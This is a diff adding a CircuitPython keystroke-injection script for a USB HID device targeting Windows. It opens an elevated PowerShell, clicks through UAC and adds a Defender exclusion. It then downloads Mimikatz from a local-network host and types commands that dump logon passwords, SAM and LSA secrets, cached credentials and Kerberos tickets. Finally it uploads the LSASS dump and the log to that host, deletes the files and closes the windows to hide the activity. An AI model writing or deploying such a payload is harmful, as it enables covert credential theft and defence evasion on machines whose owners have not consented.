@@ -1,0 +1,192 @@
+import time
+import board
+import usb_hid
+from adafruit_hid.keyboard import Keyboard
+from adafruit_hid.keyboard_layout_win_fr import KeyboardLayout
+from adafruit_hid.keycode_win_fr import Keycode
+
+keyboard = Keyboard(usb_hid.devices)
+layout = KeyboardLayout(keyboard)
+
+# Wait until everything is ready
+time.sleep(2)
+
+# Windows + R to open Run
+keyboard.press(Keycode.GUI, Keycode.R)
+keyboard.release_all()
+time.sleep(2)
+
+# Launch PowerShell
+layout.write("powershell")
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Start Windows Terminal as Admin
+layout.write("Start-Process powershell.exe -Verb RunAs")
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Approve UAC (User Account Control)
+keyboard.press(Keycode.LEFT_ARROW)
+keyboard.release_all()
+time.sleep(2)
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Prepare working directory
+layout.write('$dir = "C:\\temp"; $shell = "$dir\\shell.exe"')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+layout.write('New-Item -Path $dir -ItemType Directory -Force')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Add Defender exclusion for $dir
+layout.write('Add-MpPreference -ExclusionPath $dir')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Download Mimikatz as shell.exe
+layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8000/mimikatz.exe -OutFile $shell')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Launch Mimikatz
+layout.write('Start-Process -FilePath $shell')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Switch to Mimikatz console and execute 'log' command to start capturing
+layout.write('log C:\\temp\\mimikatz_log.txt')  # Start logging
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# 🔥 Now typing into Mimikatz 🔥
+
+# COMMAND 1: privilege::debug
+layout.write('privilege::debug')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 2: token::elevate
+layout.write('token::elevate')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 3: sekurlsa::minidump lsass.dmp
+layout.write('sekurlsa::minidump C:\\temp\\lsass.dmp')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 4: sekurlsa::logonpasswords
+layout.write('sekurlsa::logonpasswords')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 5: lsadump::sam
+layout.write('lsadump::sam')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 6: lsadump::secrets
+layout.write('lsadump::secrets')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 7: lsadump::cache
+layout.write('lsadump::cache')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 8: sekurlsa::tickets
+layout.write('sekurlsa::tickets')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMANDE 13 : kerberos::list
+layout.write('kerberos::list')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMANDE 14 : kerberos::tickets
+layout.write('kerberos::tickets')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 9: sekurlsa::ekeys
+layout.write('sekurlsa::ekeys')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 10: vault::list
+layout.write('vault::list')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 11: vault::cred
+layout.write('vault::cred')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+
+# Stop logging in Mimikatz (this stops the logging)
+layout.write('log')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# COMMAND 12: exit
+layout.write('exit')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# 🔥 Now both lsass.dmp and mimikatz_log.txt are ready 🔥
+
+# Upload lsass.dmp to server via PUT
+layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8080/lsass.dmp -Method PUT -InFile "C:\\temp\\lsass.dmp"')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Upload mimikatz_log.txt to server via PUT
+layout.write('Invoke-WebRequest -Uri http://192.168.1.42:8080/mimikatz_log.txt -Method PUT -InFile "C:\\temp\\mimikatz_log.txt"')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# 🔥 Nettoyage COMPLET du dossier C:\temp 🔥
+layout.write('Remove-Item -Path C:\\temp -Force -Recurse')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
+# Close PowerShell and Windows Terminal processes to avoid visibility
+layout.write('Stop-Process -Name powershell, WindowsTerminal')
+keyboard.press(Keycode.ENTER)
+keyboard.release_all()
+time.sleep(2)
+
